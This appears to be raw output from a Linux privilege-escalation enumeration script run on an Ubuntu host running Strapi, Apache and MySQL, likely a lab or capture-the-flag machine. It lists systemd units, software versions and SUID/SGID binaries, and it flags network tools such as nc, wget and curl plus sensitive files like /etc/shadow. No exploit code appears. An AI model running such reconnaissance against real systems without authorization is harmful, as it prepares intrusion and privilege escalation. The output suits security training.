-rw-r--r-- 1 root root  863 Jul 26 15:31 systemd-udev-settle.service
-rw-r--r-- 1 root root  755 Jul 26 15:31 systemd-udev-trigger.service
-rw-r--r-- 1 root root  797 Jul 26 15:31 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Jul 26 15:31 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Jul 26 15:31 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Jul 26 15:31 systemd-volatile-root.service
-rw-r--r-- 1 root root 1.4K Jul 26 15:31 system-update-cleanup.service
lrwxrwxrwx 1 root root   21 Jul 26 15:31 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Jul 26 15:31 urandom.service -> systemd-random-seed.service
-rw-r--r-- 1 root root  593 Jul 26 15:31 user@.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  155 Jun 21  2021 phpsessionclean.service
-rw-r--r-- 1 root root  144 Jun 21  2021 phpsessionclean.timer
-rw-r--r-- 1 root root  326 Jun 15  2021 apt-daily.service
-rw-r--r-- 1 root root  156 Jun 15  2021 apt-daily.timer
-rw-r--r-- 1 root root  238 Jun 15  2021 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Jun 15  2021 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  342 May 27  2021 getty-static.service
-rw-r--r-- 1 root root  362 May 27  2021 ondemand.service
-rw-r--r-- 1 root root  418 May 11  2021 cloud-config.service
-rw-r--r-- 1 root root  482 May 11  2021 cloud-final.service
-rw-r--r-- 1 root root  608 May 11  2021 cloud-init-local.service
-rw-r--r-- 1 root root  665 May 11  2021 cloud-init.service
-rw-r--r-- 1 root root  536 May 11  2021 cloud-config.target
-rw-r--r-- 1 root root  256 May 11  2021 cloud-init.target
-rw-r--r-- 1 root root  880 Mar 26  2021 snapd.apparmor.service
-rw-r--r-- 1 root root  432 Mar 26  2021 snapd.autoimport.service
-rw-r--r-- 1 root root  369 Mar 26  2021 snapd.core-fixup.service
-rw-r--r-- 1 root root  151 Mar 26  2021 snapd.failure.service
-rw-r--r-- 1 root root  524 Mar 26  2021 snapd.recovery-chooser-trigger.service
-rw-r--r-- 1 root root  322 Mar 26  2021 snapd.seeded.service
-rw-r--r-- 1 root root  475 Mar 26  2021 snapd.service
-rw-r--r-- 1 root root  464 Mar 26  2021 snapd.snap-repair.service
-rw-r--r-- 1 root root  373 Mar 26  2021 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Mar 26  2021 snapd.socket
-rw-r--r-- 1 root root  608 Mar 26  2021 snapd.system-shutdown.service
-rw-r--r-- 1 root root  358 Feb  9  2021 pollinate.service
lrwxrwxrwx 1 root root    9 Jan 19  2021 sudo.service -> /dev/null
-rw-r--r-- 1 root root  741 Nov  2  2020 accounts-daemon.service
-rw-r--r-- 1 root root  127 Sep 16  2020 fstrim.service
-rw-r--r-- 1 root root  205 Sep 16  2020 fstrim.timer
-rw-r--r-- 1 root root  189 Sep 16  2020 uuidd.service
-rw-r--r-- 1 root root  126 Sep 16  2020 uuidd.socket
lrwxrwxrwx 1 root root    9 Aug  6  2020 screen-cleanup.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Aug  6  2020 halt.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2020 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2020 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2020 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2020 reboot.target.wants
-rw-r--r-- 1 root root  173 Jun 15  2020 motd-news.service
-rw-r--r-- 1 root root  161 Jun 15  2020 motd-news.timer
-rw-r--r-- 1 root root  505 Jun 11  2020 dbus.service
-rw-r--r-- 1 root root  106 Jun 11  2020 dbus.socket
-rw-r--r-- 1 root root  463 May 11  2020 iscsid.service
-rw-r--r-- 1 root root  175 May 11  2020 iscsid.socket
-rw-r--r-- 1 root root  987 May 11  2020 open-iscsi.service
-rw-r--r-- 1 root root  311 Mar 31  2020 lxcfs.service
-rw-r--r-- 1 root root  498 Mar 25  2020 open-vm-tools.service
-rw-r--r-- 1 root root  383 Jan 23  2020 blk-availability.service
-rw-r--r-- 1 root root  341 Jan 23  2020 dm-event.service
-rw-r--r-- 1 root root  248 Jan 23  2020 dm-event.socket
-rw-r--r-- 1 root root  345 Jan 23  2020 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 Jan 23  2020 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  300 Jan 23  2020 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 Jan 23  2020 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  693 Jan 23  2020 lvm2-monitor.service
-rw-r--r-- 1 root root  403 Jan 23  2020 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 Jan 23  2020 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  481 Jan 14  2020 mdadm-grow-continue@.service
-rw-r--r-- 1 root root  210 Jan 14  2020 mdadm-last-resort@.service
-rw-r--r-- 1 root root  179 Jan 14  2020 mdadm-last-resort@.timer
lrwxrwxrwx 1 root root    9 Jan 14  2020 mdadm.service -> /dev/null
-rw-r--r-- 1 root root  670 Jan 14  2020 mdadm-shutdown.service
lrwxrwxrwx 1 root root    9 Jan 14  2020 mdadm-waitidle.service -> /dev/null
-rw-r--r-- 1 root root  388 Jan 14  2020 mdmonitor.service
-rw-r--r-- 1 root root 1.1K Jan 14  2020 mdmon@.service
-rw-r--r-- 1 root root  408 Dec  9  2019 vgauth.service
-rw-r--r-- 1 root root  212 Nov 11  2019 apport-autoreport.path
-rw-r--r-- 1 root root  242 Nov 11  2019 apport-autoreport.service
-rw-r--r-- 1 root root  142 Nov 11  2019 apport-forward@.service
-rw-r--r-- 1 root root  246 Nov 11  2019 apport-forward.socket
-rw-r--r-- 1 root root  254 Aug 15  2019 thermald.service
-rw-r--r-- 1 root root  346 Jul 16  2019 apache2.service
-rw-r--r-- 1 root root  418 Jul 16  2019 apache2@.service
-rw-r--r-- 1 root root  528 Jul 16  2019 apache-htcacheclean.service
-rw-r--r-- 1 root root  537 Jul 16  2019 apache-htcacheclean@.service
-rw-r--r-- 1 root root  312 Apr 23  2019 console-setup.service
-rw-r--r-- 1 root root  287 Apr 23  2019 keyboard-setup.service
-rw-r--r-- 1 root root  330 Apr 23  2019 setvtrgb.service
-rw-r--r-- 1 root root  404 Apr  9  2019 ureadahead.service
-rw-r--r-- 1 root root  250 Apr  9  2019 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Apr  9  2019 ureadahead-stop.timer
-rw-r--r-- 1 root root  412 Apr  4  2019 plymouth-halt.service
-rw-r--r-- 1 root root  426 Apr  4  2019 plymouth-kexec.service
lrwxrwxrwx 1 root root   27 Apr  4  2019 plymouth-log.service -> plymouth-read-write.service
-rw-r--r-- 1 root root  421 Apr  4  2019 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 Apr  4  2019 plymouth-quit.service
-rw-r--r-- 1 root root  200 Apr  4  2019 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 Apr  4  2019 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Apr  4  2019 plymouth-reboot.service
lrwxrwxrwx 1 root root   21 Apr  4  2019 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  532 Apr  4  2019 plymouth-start.service
-rw-r--r-- 1 root root  291 Apr  4  2019 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  368 Jan  9  2019 irqbalance.service
-rw-r--r-- 1 root root  618 Oct 15  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct 15  2018 friendly-recovery.target
-rw-r--r-- 1 root root  258 Oct 15  2018 networkd-dispatcher.service
-rw-r--r-- 1 root root  456 Jun 28  2018 ebtables.service
-rw-r--r-- 1 root root  290 Apr 24  2018 rsyslog.service
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel5.target.wants
-rw-r--r-- 1 root root 1013 Apr  6  2018 nginx.service
-rw-r--r-- 1 root root  175 Mar 27  2018 polkit.service
-rw-r--r-- 1 root root  544 Mar 22  2018 apparmor.service
-rw-r--r-- 1 root root  169 Feb 20  2018 atd.service
-rw-r--r-- 1 root root  919 Jan 28  2018 basic.target
-rw-r--r-- 1 root root  419 Jan 28  2018 bluetooth.target
-rw-r--r-- 1 root root  465 Jan 28  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Jan 28  2018 cryptsetup.target
-rw-r--r-- 1 root root  750 Jan 28  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  665 Jan 28  2018 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Jan 28  2018 emergency.target
-rw-r--r-- 1 root root  541 Jan 28  2018 exit.target
-rw-r--r-- 1 root root  480 Jan 28  2018 final.target
-rw-r--r-- 1 root root  506 Jan 28  2018 getty-pre.target
-rw-r--r-- 1 root root  500 Jan 28  2018 getty.target
-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
-rw-r--r-- 1 root root  527 Jan 28  2018 halt.target
-rw-r--r-- 1 root root  509 Jan 28  2018 hibernate.target
-rw-r--r-- 1 root root  530 Jan 28  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  593 Jan 28  2018 initrd-fs.target
-rw-r--r-- 1 root root  561 Jan 28  2018 initrd-root-device.target
-rw-r--r-- 1 root root  566 Jan 28  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  754 Jan 28  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  763 Jan 28  2018 initrd.target
-rw-r--r-- 1 root root  541 Jan 28  2018 kexec.target
-rw-r--r-- 1 root root  435 Jan 28  2018 local-fs-pre.target
-rw-r--r-- 1 root root  547 Jan 28  2018 local-fs.target
-rw-r--r-- 1 root root  445 Jan 28  2018 machine.slice
-rw-r--r-- 1 root root  532 Jan 28  2018 multi-user.target
-rw-r--r-- 1 root root  505 Jan 28  2018 network-online.target
-rw-r--r-- 1 root root  502 Jan 28  2018 network-pre.target
-rw-r--r-- 1 root root  521 Jan 28  2018 network.target
-rw-r--r-- 1 root root  554 Jan 28  2018 nss-lookup.target
-rw-r--r-- 1 root root  513 Jan 28  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  394 Jan 28  2018 paths.target
-rw-r--r-- 1 root root  592 Jan 28  2018 poweroff.target
-rw-r--r-- 1 root root  417 Jan 28  2018 printer.target
-rw-r--r-- 1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Jan 28  2018 reboot.target
-rw-r--r-- 1 root root  549 Jan 28  2018 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Jan 28  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Jan 28  2018 remote-fs.target
-rw-r--r-- 1 root root  492 Jan 28  2018 rescue.target
-rw-r--r-- 1 root root  540 Jan 28  2018 rpcbind.target
-rw-r--r-- 1 root root  442 Jan 28  2018 shutdown.target
-rw-r--r-- 1 root root  402 Jan 28  2018 sigpwr.target
-rw-r--r-- 1 root root  460 Jan 28  2018 sleep.target
-rw-r--r-- 1 root root  449 Jan 28  2018 slices.target
-rw-r--r-- 1 root root  420 Jan 28  2018 smartcard.target
-rw-r--r-- 1 root root  396 Jan 28  2018 sockets.target
-rw-r--r-- 1 root root  420 Jan 28  2018 sound.target
-rw-r--r-- 1 root root  503 Jan 28  2018 suspend.target
-rw-r--r-- 1 root root  393 Jan 28  2018 swap.target
-rw-r--r-- 1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  558 Jan 28  2018 sysinit.target
-rw-r--r-- 1 root root  767 Jan 28  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  710 Jan 28  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.4K Jan 28  2018 syslog.socket
-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  564 Jan 28  2018 systemd-initctl.socket
-rw-r--r-- 1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  882 Jan 28  2018 systemd-journald.socket
-rw-r--r-- 1 root root  631 Jan 28  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  657 Jan 28  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  635 Jan 28  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  445 Jan 28  2018 system.slice
-rw-r--r-- 1 root root  592 Jan 28  2018 system-update.target
-rw-r--r-- 1 root root  445 Jan 28  2018 timers.target
-rw-r--r-- 1 root root  435 Jan 28  2018 time-sync.target
-rw-r--r-- 1 root root  457 Jan 28  2018 umount.target
-rw-r--r-- 1 root root  432 Jan 28  2018 user.slice
-rw-r--r-- 1 root root  493 Jan 25  2018 ssh.service
-rw-r--r-- 1 root root  244 Jan 25  2018 ssh@.service
-rw-r--r-- 1 root root  216 Jan 16  2018 ssh.socket
-rw-r--r-- 1 root root  462 Jan 15  2018 mysql.service
-rw-r--r-- 1 root root  251 Nov 16  2017 cron.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.path
-rw-r--r-- 1 root root  234 Apr 22  2017 acpid.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.socket
-rw-r--r-- 1 root root  626 Nov 28  2016 ifup@.service
-rw-r--r-- 1 root root  735 Nov 25  2016 networking.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Jul 26 15:31 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Jul 26 15:31 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Jul 26 15:31 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Jul 26 15:31 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Jul 26 15:31 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Jul 26 15:31 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Jun 11  2020 dbus.socket -> ../dbus.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Jul 26 15:31 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Jul 26 15:31 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Jul 26 15:31 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Jul 26 15:31 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Jul 26 15:31 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Jul 26 15:31 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Jul 26 15:31 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Jul 26 15:31 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Jul 26 15:31 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Jul 26 15:31 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Jul 26 15:31 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 27 Jul 26 15:31 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 Jul 26 15:31 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Jul 26 15:31 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Jul 26 15:31 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Jul 26 15:31 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Jul 26 15:31 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Jul 26 15:31 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Jul 26 15:31 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 24 Jul 26 15:31 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 Jul 26 15:31 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 Jul 26 15:31 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Apr  4  2019 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Jul 26 15:31 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jul 26 15:31 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Jul 26 15:31 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Jul 26 15:31 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Jul 26 15:31 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Jul 26 15:31 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Jul 26 15:31 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Jul 26 15:31 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 15 Jun 11  2020 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 29 Apr  4  2019 plymouth-quit-wait.service -> ../plymouth-quit-wait.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jul 26 15:31 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Jul 26 15:31 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 May 27  2021 debian.conf

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 May 27  2021 timeout.conf

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Jul 16  2019 apache2-systemd.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Apr  4  2019 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Apr  4  2019 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Apr  4  2019 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Apr  4  2019 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Apr  4  2019 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 645 Jan 28  2018 80-container-host0.network
-rw-r--r-- 1 root root 718 Jan 28  2018 80-container-ve.network
-rw-r--r-- 1 root root 704 Jan 28  2018 80-container-vz.network
-rw-r--r-- 1 root root 412 Jan 28  2018 99-default.link

/lib/systemd/system-generators:
total 248K
-rwxr-xr-x 1 root root  23K Jul 26 15:31 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  10K Jul 26 15:31 systemd-debug-generator
-rwxr-xr-x 1 root root  31K Jul 26 15:31 systemd-fstab-generator
-rwxr-xr-x 1 root root  14K Jul 26 15:31 systemd-getty-generator
-rwxr-xr-x 1 root root  26K Jul 26 15:31 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  10K Jul 26 15:31 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  10K Jul 26 15:31 systemd-rc-local-generator
-rwxr-xr-x 1 root root  10K Jul 26 15:31 systemd-system-update-generator
-rwxr-xr-x 1 root root  31K Jul 26 15:31 systemd-sysv-generator
-rwxr-xr-x 1 root root  14K Jul 26 15:31 systemd-veritysetup-generator
-rwxr-xr-x 1 root root 4.9K May 11  2021 cloud-init-generator
-rwxr-xr-x 1 root root  27K Mar 26  2021 snapd-generator
-rwxr-xr-x 1 root root  11K Jan 23  2020 lvm2-activation-generator
-rwxr-xr-x 1 root root  286 Jun 25  2019 friendly-recovery

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 951 Jan 28  2018 90-systemd.preset

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Feb 22  2018 hdparm

/lib/systemd/system-shutdown:
total 4.0K
-rwxr-xr-x 1 root root 160 Jan 14  2020 mdadm.shutdown


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.21p2


[-] MYSQL version:
mysql  Ver 14.14 Distrib 5.7.35, for Linux (x86_64) using  EditLine wrapper


[-] Apache version:
Server version: Apache/2.4.29 (Ubuntu)
Server built:   2021-06-18T11:06:22


[-] Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/gcc
/usr/bin/curl


[-] Installed compilers:
ii  g++                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C++ compiler
ii  g++-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C++ compiler
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1667 May 26  2021 /etc/passwd
-rw-r--r-- 1 root root 733 Jul 29 04:49 /etc/group
-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
-rw-r----- 1 root shadow 1181 Jul 28 16:16 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 436552 Aug 11 18:02 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 117880 Mar 26  2021 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount


[-] SGID files:
-rwxr-sr-x 1 root shadow 34816 Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Apr  8  2021 /sbin/unix_chkpwd
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root tty 30800 Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 362640 Aug 11 18:02 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter


[+] Files with POSIX capabilities set:
/usr/bin/mtr-packet = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 14867 Oct 13  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf
-rw-r--r-- 1 root root 4861 Feb 22  2018 /etc/hdparm.conf
-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
-rw-r--r-- 1 root root 1358 Jan 30  2018 /etc/rsyslog.conf
-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
-rw-r--r-- 1 root root 6920 Sep 20  2018 /etc/overlayroot.conf
-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 703 Aug 21  2017 /etc/logrotate.conf
-rw-r--r-- 1 root root 144 May 25  2021 /etc/kernel-img.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 19 Aug  3 21:17 /etc/resolv.conf
-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
-rw-r--r-- 1 root root 403 Mar  1  2018 /etc/updatedb.conf
-rw-r--r-- 1 root root 513 Aug  6  2020 /etc/nsswitch.conf
-rw-r--r-- 1 root root 3028 Aug  6  2020 /etc/adduser.conf
-rw-r--r-- 1 root root 6841 May 25  2021 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
-rw-r--r-- 1 root root 138 Mar 24  2020 /etc/sos.conf
-rw-r--r-- 1 root root 350 Aug  6  2020 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf


[-] Current user's history files:
-rw------- 1 strapi strapi 402 Jan 10 17:31 /opt/strapi/.mysql_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/developer/.bash_history


[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r-- 1 strapi strapi 2015 Aug 23 11:30 /opt/strapi/.pm2/dump.pm2.bak
-rw-rw-r-- 1 strapi strapi 7138 Feb 13  2018 /opt/strapi/myapi/node_modules/request/node_modules/form-data/README.md.bak


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  6  2020 .
